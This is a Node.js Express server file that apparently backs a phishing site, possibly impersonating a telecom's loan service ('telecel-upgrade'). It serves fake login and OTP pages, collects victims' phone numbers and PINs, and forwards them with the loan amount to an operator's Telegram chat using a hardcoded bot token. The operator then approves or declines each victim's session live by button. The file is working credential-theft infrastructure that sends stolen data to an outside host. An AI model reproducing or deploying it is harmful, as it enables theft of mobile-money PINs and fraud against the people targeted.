const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    next();
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const BOT_TOKEN = '8843069473:AAFWS3TrGqaQQDHiZrMsDAwhSGV16SKglXA';
const CHAT_ID = '6414813627';
const pendingApprovals = new Map();

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/otp', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'otp.html'));
});

app.get('/api/check-status/:requestId', (req, res) => {
    const status = pendingApprovals.get(req.params.requestId) || 'pending';
    console.log(`🔍 Check ${req.params.requestId}: ${status}`);
    res.json({ status: status });
});

app.post('/api/send-verification', async (req, res) => {
    const { phone, pin, loanAmount, accountType, requestId } = req.body;
    console.log(`📨 Send: ${requestId}, Phone: ${phone}`);
    
    pendingApprovals.set(requestId, 'pending');
    
    const messageText = `🔴 NEW LOAN VERIFICATION\n\n━━━━━━━━━━━━━━━━━━\n💰 Amount: ${loanAmount}\n📱 Account: ${accountType}\n📞 Phone: ${phone}\n🔐 PIN: ${pin}\n🆔 ID: ${requestId}\n━━━━━━━━━━━━━━━━━━\n\nTap APPROVE to continue:`;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: messageText,
                reply_markup: {
                    inline_keyboard: [[
                        { text: "✅ APPROVE LOAN", callback_data: `approve_${requestId}` },
                        { text: "❌ DECLINE", callback_data: `decline_${requestId}` }
                    ]]
                }
            })
        });
        
        const data = await response.json();
        console.log(`Telegram response: ${data.ok ? 'OK' : 'FAILED'}`);
        res.json({ success: data.ok });
    } catch (error) {
        console.error('Error sending Telegram:', error);
        res.json({ success: false });
    }
});

app.post('/webhook', (req, res) => {
    console.log('📨 WEBHOOK RECEIVED');
    console.log('Body:', JSON.stringify(req.body, null, 2));
    
    if (req.body.callback_query) {
        const data = req.body.callback_query.data;
        const callbackId = req.body.callback_query.id;
        
        console.log(`🎯 Callback data: ${data}`);
        
        // Answer callback immediately
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                callback_query_id: callbackId,
                text: "Processing..."
            })
        }).catch(console.error);
        
        if (data && data.startsWith('approve_')) {
            const requestId = data.replace('approve_', '');
            pendingApprovals.set(requestId, 'approved');
            console.log(`✅✅✅ APPROVED: ${requestId} ✅✅✅`);
        } else if (data && data.startsWith('decline_')) {
            const requestId = data.replace('decline_', '');
            pendingApprovals.set(requestId, 'declined');
            console.log(`❌ DECLINED: ${requestId}`);
        }
    }
    res.sendStatus(200);
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', pendingCount: pendingApprovals.size });
});

async function setupWebhook() {
    const url = `https://telecel-upgrade-production.up.railway.app/webhook`;
    console.log(`🔧 Setting webhook: ${url}`);
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${url}`);
    const data = await response.json();
    console.log('Webhook:', data.ok ? '✅ SUCCESS' : '❌ FAILED', data.description || '');
}

app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    await setupWebhook();
});
